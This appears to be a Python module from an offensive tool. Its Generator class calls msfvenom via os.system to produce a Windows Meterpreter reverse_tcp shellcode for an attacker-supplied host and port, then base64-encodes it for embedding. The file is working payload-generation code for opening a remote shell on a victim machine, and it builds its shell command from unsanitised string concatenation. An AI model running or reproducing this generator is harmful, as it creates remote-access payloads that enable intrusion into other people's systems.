from display import *

import os
import re
import base64

class Generator():

	shellcode = ''

	def genShellcode(self, host, port, arch):
		#TODO fix to us estring .format\
		code = ''
		if (arch  == "x86"):
			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f raw > /tmp/metasploit 2> /dev/null")
		else:
			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f raw > /tmp/metasploit 2> /dev/null")

		with open("/tmp/metasploit", 'rb') as f:
			code = f.read()
		#self.shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
		#self.shellcode = ''.join(i[0].replace('', '') for i in self.shellcode)
		self.shellcode = str(base64.b64encode(code))
		self.shellcode = self.shellcode.replace(self.shellcode[:2], '')
		self.shellcode = self.shellcode[:-1]
		return self.shellcode
